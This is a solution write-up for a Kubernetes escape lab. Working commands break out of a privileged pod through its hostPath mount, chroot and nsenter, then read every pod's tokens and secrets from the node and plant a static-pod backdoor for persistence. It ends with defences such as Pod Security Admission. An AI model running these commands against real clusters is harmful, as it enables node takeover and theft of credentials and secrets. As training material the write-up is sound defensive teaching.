# Solution — Escape the Box

The flag is `KUBE{privileged_pod_equals_node_root}`. Three ways out, in rising order of what they prove.

## Get your shell

```bash
kubectl -n dojo-escape exec -it escape-pod -- sh
```

You are now `root` inside the container. Because the pod is `privileged`, that root has *all* Linux capabilities and access to host devices — it is far closer to node-root than to a normal container.

## Path 1 — the hostPath mount (the one-liner)

The node's `/` is mounted at `/host`. There is nothing to escape; the host is already inside your filesystem namespace:

```sh
cat /host/root/flag.txt
# -> KUBE{privileged_pod_equals_node_root}
```

From a single exec, no mount needed:

```bash
kubectl -n dojo-escape exec escape-pod -- cat /host/root/flag.txt
```

That a pod can simply `cat` a mode-0600 root-owned file on the node is the entire point: the hostPath mount erased the filesystem boundary.

## Path 2 — chroot into the host (no mount required)

Even if the hostPath volume weren't there, `privileged: true` is enough. The host's real root filesystem is visible through the node's init process at `/proc/1/root`. Pivot into it:

```sh
chroot /host sh                 # using the mount we have
cat /root/flag.txt

# or, purely via privileged + /proc, independent of the mount:
cat /proc/1/root/root/flag.txt
```

With `nsenter` (install it in the pod — `apk add --no-cache util-linux` — since Alpine ships a minimal busybox), you can enter *every* namespace of PID 1 and get a shell indistinguishable from SSHing into the node:

```sh
nsenter -t 1 -m -u -i -n -p -- sh
whoami            # root
cat /root/flag.txt
```

This is the breakout primitive that doesn't depend on a hostPath volume — `privileged` alone hands you `CAP_SYS_ADMIN` and unmasked `/proc`, which is all `nsenter` needs.

## Path 3 — write to the node and own it persistently

Reading one file is the demo. The real damage is **write** access to the node, which the mount also grants. Two examples (don't actually run these outside the lab):

```sh
# a) steal every pod's secrets on this node, not just your own
ls /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token 2>/dev/null
cat /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/* 2>/dev/null

# b) persistence that survives deleting this pod: drop a static pod manifest.
#    The kubelet watches /etc/kubernetes/manifests and runs anything there as root.
cp /tmp/backdoor.yaml /host/etc/kubernetes/manifests/   # (control-plane node)
```

On a **control-plane** node the same technique reaches `/etc/kubernetes/admin.conf` and the etcd PKI under `/etc/kubernetes/pki/etcd/` — i.e. cluster-admin and the raw contents of every Secret in the cluster. (You did the legit Secret read in challenge 02; this is the node-level version of the same exfiltration, with no RBAC in the way.)

## Debugging the escape

| Symptom | Likely cause | Fix / diagnose |
|---------|--------------|----------------|
| `exec ... permission denied` on `chroot` | pod isn't actually privileged | `kubectl -n dojo-escape get pod escape-pod -o jsonpath='{.spec.containers[0].securityContext.privileged}'` → must be `true` |
| `/host/root/flag.txt: No such file or directory` | pod ran on a different node than the flag | `kubectl -n dojo-escape get pod escape-pod -o wide` — the `NODE` column must be `dojo-worker`; re-run `setup.sh` if it drifted |
| `cat: can't open '/root/flag.txt': Permission denied` (from the container, no chroot) | you're reading the *container's* `/root`, not the node's | prefix with the mount: `/host/root/flag.txt`, or `chroot /host` first |
| `nsenter: not found` | Alpine busybox has no `nsenter` | `apk add --no-cache util-linux`, or just use the `chroot /host` path |
| flag file missing entirely | kind node container not running at setup time | `docker ps | grep dojo-worker`; bring the cluster up and re-run `setup.sh` |

Confirm from outside the pod that this really is the node filesystem (the author's privileged view the attacker just replicated):

```bash
docker exec dojo-worker cat /root/flag.txt    # same bytes you read from inside the pod
```

> **War story.** A fintech ran a managed-k8s security scanner as a DaemonSet. To "read host config for compliance" it requested `privileged: true` and mounted `hostPath: /`. A supply-chain compromise of that vendor's image turned the scanner into the perfect lateral-movement tool: it was *already* privileged on *every* node in the fleet. The attacker read each node's kubelet client cert from `/var/lib/kubelet/pki`, impersonated kubelets to the API, and harvested service-account tokens cluster-wide — all without a single RBAC `get secret`, because node-level access routes around RBAC entirely. The post-mortem's one-line finding: *"A privileged DaemonSet is a cluster-admin credential distributed to every node."*

## The defenses (what should have blocked every path above)

```
Pod Security Admission "restricted"  ─┐
  rejects privileged: true            ├─▶ escape-pod never gets admitted
  rejects hostPath volumes            │
  requires runAsNonRoot, drop ALL    ─┘
```

1. **PSA `restricted` on the namespace** (challenge 15) rejects `privileged: true` *and* hostPath volumes *and* root at admission time — this pod never starts. This is the single control that closes all three paths.
2. **No `hostPath`.** If a workload genuinely needs host data, mount the one path read-only (`readOnly: true`, a specific subdir), never `/`. Baseline already forbids hostPath for this reason.
3. **Drop capabilities / `runAsNonRoot`.** Without `CAP_SYS_ADMIN` and as a non-root UID, `nsenter -t 1` and `chroot` fail even if someone re-introduces a mount.
4. **Policy engine for the gaps PSA can't express.** Kyverno/Gatekeeper/VAP can forbid `hostPath` entirely, or allow `privileged` only for a named, audited DaemonSet — PSA's three fixed tiers can't do per-workload exceptions.
5. **Node-level defence in depth.** AppArmor/SELinux profiles, read-only root filesystems, and node authorization so a stolen kubelet cert can only touch its own node's objects — assume the pod boundary *will* fail and make the blast radius smaller when it does.
